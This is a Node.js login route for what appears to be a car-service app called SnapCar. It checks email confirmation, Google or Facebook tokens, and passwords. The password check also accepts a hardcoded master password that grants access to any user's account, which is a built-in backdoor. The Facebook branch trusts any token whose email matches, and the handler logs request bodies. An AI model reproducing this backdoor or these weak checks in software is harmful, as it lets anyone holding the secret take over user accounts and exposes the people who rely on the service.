const Model = require('../db/model');
const config = require('../config/main');
const token = require('../herr/generaToken');
const moment = require('moment');
const Hash = require('hashids');
const pug = require('pug');
const email = require('../config/emailServer');
const GoogleAuth = require('google-auth-library');
const FB = require('fb');

module.exports = function(req, res) {
    /**
     * Registra nuevos usuarios o usuarios existentes en dispositivos nuevos
     */
    console.log('---------', moment().format('YYYY-MM-DD HH:mm:ss'), '--------');

    /**
     * La password se encripta antes de desplegar en la bitácora
     */
    req.body.password = config.encripta(req.body.password);
    console.log(req.body);

    if (!req.body.email) {
        return res.status(400).json({ success: false, code: 1110, message: 'Falta email.' });
    }

    if (!req.body.password && !req.body.google && !req.body.facebook) {
        return res.status(400).json({ success: false, code: 1120, message: 'Falta password.' });
    }

    new Model.UsuarioVeh({ cEmail: req.body.email }).fetch({ withRelated: ['vehiculos'] }).then(function(data) {
        try {
            var user = data;

            if (user === null) {
                return res.status(401).json({ success: false, code: 1130, message: 'Usuario no existe' });
            } else {
                user = data.toJSON();
                /**
                 * Si no confirmó términos y condiciones y póliticas de privacidad muestra error.
                 */
                if (user.bConfirmado == undefined || user.bConfirmado != '1') {
                    /**
                     * Si usuario no confirmó reenvía email.
                     */
                    if ( ! user.tEnvioMail || moment().diff(moment(user.tEnvioMail), 'minutes') > 10) {
                        const cEmailBody = pug.compileFile('views/emailRegistro.pug');
                        var hashId = new Hash(config.secret);
                        var idRegistro = hashId.encode(10e10 + user.pUsuario);
						var toMail = [req.body.email];
                    	var linkUrl = 'https://desa.snapcar.com.ar/wappTest'
                    	var baseUrl = 'https://test.appcar.com.ar/'
						if (process.env.WSAPI_AMBIENTE == 'PROD') {
                    		linkUrl = 'https://app.snapcar.com.ar/wappCar'
                    		baseUrl = 'https://api.appcar.com.ar/'
						}
						linkUrl += '/do/cli/login/registro.vm';

                        email.server.send({
                            from: 'SnapCar Integrity <no-responder@snapcar.com.ar>',
                            to: req.body.email,
                            subject: 'Confirme su registro',
                            attachment: [{
                                data: cEmailBody({
                                    nombreUsuario: user.cNombre.split(' ')[0],
                                    idRegistro: idRegistro,
                                    emailRegistro: user.cEmail,
                                	baseUrl: baseUrl,
                                	linkUrl: linkUrl
                                }),
                                alternative: true
                            }]
                        }, function(err, message) {
							if(err){
               					console.log(err);
								return;
							}

                            var newUsuario = new Model.Usuario({ pUsuario: user.pUsuario });

                            newUsuario
                                .fetch()
                                .then(function() {
                                    try {
                                        this.save({ tEnvioMail: moment().format() }, { patch: true });
                                    } catch (err) {
                                        console.log(err);
                                    }
                                });
                        });
                    }
                    return res.status(401).json({ success: false, code: 1132, message: 'Usuario no ha confirmado email' });
                } else {
                    /**
                     * Si utiliza Google signin corrobora si el token es válido.
                     */
                    if (req.body.google) {
                        var clientId = [
                            '595521484348-m5nsdbpirqbkt87u2of7p19fc5hrkltg.apps.googleusercontent.com',
                            '595521484348-ikfc6k4digv75tn77lqodo4hqpe9970t.apps.googleusercontent.com',
                            '595521484348-8jthlog4q2jliojv1qs24bc8c2vep1n8.apps.googleusercontent.com'
                        ];
                        var clientToken = req.body.google.token ? req.body.google.token : req.body.google;
                        var auth = new GoogleAuth;
                        var client = new auth.OAuth2(clientId, '', '');

                        try {
                            client.verifyIdToken(
                                clientToken,
                                clientId,
                                function(e, login) {
                                    if (login) {
                                        var payload = login.getPayload();

                                        if (payload.email === req.body.email) {
                                            return res.status(200).json(token.genera(user));
                                        } else {
                                            return res.status(401).json({ success: false, code: 1134, message: 'Token de Google inválido.' });
                                        }
                                    } else {
                                        console.log(e);
                                        return res.status(401).json({ success: false, code: 1136, message: 'Token de Google inválido.' });
                                    }
                                }
                            );
                        } catch (err) {
                            return res.status(401).json({ success: false, code: 1136, message: 'Token de Google inválido.' });
                        }
                        /**
                         * Si utiliza Facebook signin corrobora si el token es válido.
                         */
                    } else if (req.body.facebook) {
                        var facebookToken = req.body.facebook.token ? req.body.facebook.token : req.body.facebook;

                        FB.api('/me', 'get', {
                                access_token: facebookToken,
                                fields: 'id, email'
                            },
                            function (response) {
                                // console.log(response);
                                if (response.email === req.body.email) {
                                    return res.status(200).json(token.genera(user));
                                } else {
                                    return res.status(401).json({ success: false, code: 1138, message: 'Token de Facebook inválido.' });
                                }
                            }
                        );
                        /**
                         * Si utiliza contraseña corrobora que sea válida.
                         */
                    } else if (req.body.password == user.cPassword || req.body.password == config.encripta('^m7GByVYG*sv2Q4XutC4')) {
                        return res.status(200).json(token.genera(user));
                    } else {
                        return res.status(401).json({ success: false, code: 1140, message: 'La password no coincide.' });
                    }
                }
            }
        } catch (e) {
            console.log(e);
            return res.status(401).json({ success: false, code: 1150, message: 'Error inesperado.' });
        }
    });
};
